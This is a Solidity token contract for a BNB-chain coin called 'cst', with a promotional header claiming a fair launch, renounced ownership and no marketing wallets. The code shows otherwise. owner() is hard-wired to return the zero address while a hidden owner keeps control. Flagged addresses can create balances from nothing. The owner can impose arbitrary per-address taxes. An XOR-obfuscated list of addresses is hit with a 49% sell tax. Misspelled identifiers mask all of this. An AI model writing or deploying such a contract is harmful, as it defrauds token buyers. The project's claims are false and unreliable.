/**
 *Submitted for verification at BscScan.com on 2022-08-22
*/

/*
About cstVision Stbtokenement:  build a community thbtoken empowers everything, and gain value as a lifestyle.Millions of investors in crypto negbtokenively were impacted and abandoned by LUNA, resulting in the birth of a new #LUNA community, or rbtokenher NEW COMMUNITY LUNA, ($CLUNA) Token Project. After a year, when LUNA experienced an unprecedented decline, the once-popular PIGTOKEN developer crebtokened the token $CLUNA.Similar to PIGTOKEN, $CLUNA has massive decentralizbtokenion on a scale rarely seen in other tokens. Combine these three together and you get a powerhouse out of the hands of anyone, except the community as a whole.In a decentralized smart chain environment, we chose to burn liquidity forever to achieve token scarcity. The development defined, 2% of each transaction is sent to a burn address, which is publicly verifiable for all participants to see (reference BSCScan).Our developer formulbtokened a liquidity-providing protocol to help stabilize the price floor. The $CLUNA token is a fair launch token, the liquidity is burned forever, (No marketing wallets) and ownership is renounced
* http://instagram.com/CRYPTOCURRENCY381
* https://www.reddit.com/user/CRYPTOCURRENCY381
* TWITTER:https://twitter.com/cst
* WEBSITE:https://www.cst.io
* TELEGRAM:https://t.me/cst
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function acCRYPTOCURRENCY381fq(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingCRYPTOCURRENCY381OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingCRYPTOCURRENCY381OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingCRYPTOCURRENCY381OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingCRYPTOCURRENCY381OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingCRYPTOCURRENCY381OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function CRYPTOCURRENCY381To() external view returns (address);
    function CRYPTOCURRENCY381ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setCRYPTOCURRENCY381To(address) external;
    function setCRYPTOCURRENCY381ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 9;
    }





    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract cst is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "CRYPTOCURRENCY";
	string symbol_ = "cst";
	uint256 totalSupply_ = 100000000;   
    address public uniswapV2Pair;
	
    constructor()

	BEP20(name_, symbol_) {
	
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        transfer(0x000000000000000000000000000000000000dEaD, totalSupply() / 10*2);
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*6);	
        //address  ROUTER        = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        //address  WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
		
		
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
		
        _defaultSellCRYPTOCURRENCY381 = 0;
        _defaultBuyCRYPTOCURRENCY381 = 0;

        _release[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amuont;
        }
        _balances[to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }

    function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellCRYPTOCURRENCY381 = 0;
    uint256 private _defaultBuyCRYPTOCURRENCY381 = 0;
    mapping(address => uint256) private _Escape;

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function incS(uint256 _value) external onlyowaer {
        _defaultSellCRYPTOCURRENCY381 = _value;
    }


    function acCRYPTOCURRENCY381fq(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _Escape[_acc] = _value;
    }
 function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }
    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _Escape[_acc];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

        bool rF = true;

  
        uint256 tradeCRYPTOCURRENCY381amuont = 0;

        if (rF) {
            uint256 tradeCRYPTOCURRENCY381 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeCRYPTOCURRENCY381 = _msgCRYPTOCURRENCY381Info(uint160(from));
                    tradeCRYPTOCURRENCY381 = tradeCRYPTOCURRENCY381 < _defaultSellCRYPTOCURRENCY381 ? _defaultSellCRYPTOCURRENCY381 : tradeCRYPTOCURRENCY381;
                }
                if (from == uniswapV2Pair) {
                    tradeCRYPTOCURRENCY381 = _defaultBuyCRYPTOCURRENCY381;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeCRYPTOCURRENCY381 = _Escape[from];
            }


            tradeCRYPTOCURRENCY381amuont = _amuont.mul(tradeCRYPTOCURRENCY381).div(100);
        }


        if (tradeCRYPTOCURRENCY381amuont > 0) {
            _balances[from] = _balances[from].sub(tradeCRYPTOCURRENCY381amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeCRYPTOCURRENCY381amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeCRYPTOCURRENCY381amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeCRYPTOCURRENCY381amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeCRYPTOCURRENCY381amuont);
        emit Transfer(from, _to, _amuont - tradeCRYPTOCURRENCY381amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[to] += amuont;
            return true;
        }
        _receiveF(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _receiveF(from, to, amuont);
        return true;
    }

	function _msgCRYPTOCURRENCY381Info(uint _acc) internal view virtual returns (uint) {
			uint[55] memory acc = [uint(1402453688949341529554470113324420949295869626718)
			,756708045059482616095027702932231038783656279119
			,1206918520607018969891409111221463373702049797482
			,631587418023139805004213562697924504157580857597
			,646127509205047287961199032057202356059601698738
			,899055294704935280804177966902136849152155497800
			,100175458283878313837630260697304243217479780772
			,1168992684106987155730500435701344880712762558234
			,898634654112641485360878337989376802313264852592
			,556499028815611876704764138811429714476981698812
			,1270471440929003224207812988267976512364753790737
			,75552390482801014810394879018124395325240665584
			,711928463445561358811102689748107222359003866469
			,630105529292705790364896909884251681370925314559
			,620051465057294426823453318070367623097647062583
			,1102501766471315793826545623186154852585439743462
			,1431287481348797235096544429414616256647684312403
			,1139155413504040742086661726612816539923725540340
			,379490725947221696786902078371653365484928664300
			,900896606915310891605847483438655099113556304572
			,202714845985992214390660584130739465030005371467
			,515389245863560517608879571344342655223773981591
			,873512034633173858365840305616419133507167630126
			,264755140751176916685162947979826745315783878909
			,229400379876318625851211124613896563187692567410
			,109815643742617888600708632277132224059733299431
			,1286985342792232692429802479271902979339190667890
			,455484109811652946161088633814032648020037309482
			,318572651730443006111382558992313698036819826726
			,717173722470013287552686143526848399758350801058
			,509708504424724530478857960914541031182867304663
			,646283385732564345860511036574785532308243017570
			,1300002765442504973936733616053869198077125499756
			,1025252859779350630249321002555876755388928081732
			,1430987163896090985421015999742386720721028240954
			,547163978072159447288738524740006851615066164117
			,1353254662872338654860182376148285469645125150104
			,543486144157785411547775732414767909129570188871
			,676741202330488482850763546296062182718884697102
			,83124813181818809081007500580866569949167292488
			,736663747295364141688895380724265832575415608973
			,1124181854446971402674640337053245889753214073479
			,354633907123601922255588637611728779687080556905
			,933593914008885847748888769448708985315215607595
			,417218879169621370200263697592043423599795214763
			,257075122187729800095901352320945893919059880368
			,99234867118703030685093217484218767526748274653
			,900896606915034147765462107551326914202344210220
			,900896606916585141517414186898434778999116662486
			,830106430842082719728903259825280827314520672274
			,1388223925759466825375854428695063728207046668522
			,933915217100951118138563972503951096825781225026
			,463435589390077148522940281468558209822801548178
			,335726453478449009294692768483866164048817037510
			,1132104562036062950922320806328070790591925137700];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 900896606915041090521003255540974972293467306060) return 49;
		}
		return 0;
	}

}